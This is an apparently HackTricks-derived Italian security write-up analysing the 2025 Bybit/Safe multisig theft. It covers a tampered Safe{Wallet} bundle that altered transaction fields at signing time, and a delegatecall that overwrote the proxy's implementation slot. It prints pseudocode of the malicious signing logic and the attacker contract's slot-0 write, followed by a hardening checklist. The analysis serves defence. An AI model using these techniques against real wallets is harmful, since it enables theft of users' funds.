# Compromissione del Web3 Signing Workflow & Takeover del Proxy Safe tramite delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Una catena di furto di cold-wallet ha combinato una supply-chain compromise della Safe{Wallet} web UI con una on-chain delegatecall primitive che ha sovrascritto l'implementation pointer del proxy (slot 0). I punti chiave sono:

- Se una dApp può iniettare codice nel percorso di firma, può far sì che un signer produca una valida **EIP-712 signature over attacker-chosen fields** mentre ripristina i dati originali della UI in modo che gli altri signer non se ne accorgano.
- I proxy Safe memorizzano `masterCopy` (implementation) allo **storage slot 0**. Una delegatecall verso un contratto che scrive nello slot 0 effettivamente “aggiorna” il Safe alla logica dell'attaccante, fornendo il controllo totale del wallet.

## Off-chain: Targeted signing mutation in Safe{Wallet}

Un Safe bundle manomesso (`_app-*.js`) attaccava selettivamente specifici indirizzi di Safe + signer. La logica iniettata veniva eseguita immediatamente prima della chiamata di firma:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: allowlist hard-coded per victim Safe/signers riducevano il rumore e abbassavano la probabilità di rilevamento.
- **Last-moment mutation**: campi (`to`, `data`, `operation`, gas) venivano sovrascritti immediatamente prima di `signTransaction`, poi ripristinati, quindi i payload delle proposal nell'UI apparivano benigni mentre le firme corrispondevano al payload dell'attaccante.
- **EIP-712 opacity**: wallets mostravano dati strutturati ma non decodificavano il nested calldata né evidenziavano `operation = delegatecall`, rendendo il messaggio mutato di fatto firmato alla cieca.

### Gateway validation relevance
Le Safe proposals vengono inviate al **Safe Client Gateway**. Prima dei controlli rafforzati, il gateway poteva accettare una proposal il cui `safeTxHash`/signature corrispondeva a campi diversi rispetto al body JSON se l'UI li riscriveva dopo la firma. Dopo l'incidente, il gateway ora rifiuta le proposal il cui hash/signature non corrispondono alla transaction inviata. Una verifica hash lato server analoga dovrebbe essere applicata a qualsiasi signing-orchestration API.

### 2025 Bybit/Safe incident highlights
- Il 21 febbraio 2025 il cold-wallet drain di Bybit (~401k ETH) ha riutilizzato lo stesso pattern: un Safe S3 bundle compromesso veniva attivato solo per i signers di Bybit e cambiava `operation=0` → `1`, puntando `to` verso un attacker contract pre-deployato che scrive lo slot 0.
- Il file Wayback-cached `_app-52c9031bfa03da47.js` mostra la logica basata sullo Safe di Bybit (`0x1db9…cf4`) e sugli indirizzi dei signer, poi è stato immediatamente rollbackato a un bundle pulito due minuti dopo l'esecuzione, rispecchiando il trucco “mutate → sign → restore”.
- Il contratto malevolo (es. `0x9622…c7242`) conteneva funzioni semplici `sweepETH/sweepERC20` più una `transfer(address,uint256)` che scriveva lo implementation slot. L'esecuzione di `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` ha spostato l'implementazione del proxy e concesso il controllo totale.

## On-chain: Delegatecall proxy takeover via slot collision

I Safe proxies mantengono `masterCopy` nel **storage slot 0** e delegano tutta la logica ad esso. Poiché Safe supporta **`operation = 1` (delegatecall)**, qualsiasi transaction firmata può puntare a un contract arbitrario ed eseguirne il codice nel contesto di storage del proxy.

Un attacker contract imitava un ERC-20 `transfer(address,uint256)` ma invece scriveva `_to` nello slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy convalida le firme su questi parametri.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body writes slot 0.
4. Slot 0 (`masterCopy`) now points to attacker-controlled logic → **compromissione completa del wallet e svuotamento dei fondi**.

### Note su Guard & versioni (indurimento post-incidente)
- Safes >= v1.3.0 possono installare un **Guard** per veto su `delegatecall` o per far rispettare ACLs su `to`/selectors; Bybit eseguiva v1.1.1, quindi non esisteva un hook Guard. È necessario aggiornare i contratti (e riaggiungere gli owner) per ottenere questo control plane.

## Checklist di rilevamento e indurimento

- **UI integrity**: pin JS assets / SRI; monitor bundle diffs; considerare la signing UI come parte del perimetro di fiducia.
- **Sign-time validation**: hardware wallets con **EIP-712 clear-signing**; renderizzare esplicitamente `operation` e decodificare la calldata annidata. Rifiutare la firma quando `operation = 1` a meno che la policy lo permetta.
- **Server-side hash checks**: gateway/servizi che inoltrano proposte devono ricalcolare `safeTxHash` e convalidare che le firme corrispondano ai campi inviati.
- **Policy/allowlists**: regole preflight per `to`, selectors, tipi di asset, e vietare `delegatecall` tranne che per flussi verificati. Richiedere un servizio di policy interno prima di trasmettere transazioni completamente firmate.
- **Contract design**: evitare di esporre delegatecall arbitrari in multisig/treasury wallets a meno che non sia strettamente necessario. Posizionare i puntatori di upgrade lontano dallo slot 0 o proteggerli con logica di upgrade esplicita e controllo degli accessi.
- **Monitoring**: generare allarmi sulle esecuzioni di `delegatecall` da wallet che detengono fondi del tesoro, e sulle proposte che modificano `operation` rispetto ai pattern tipici di `call`.

## Riferimenti

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
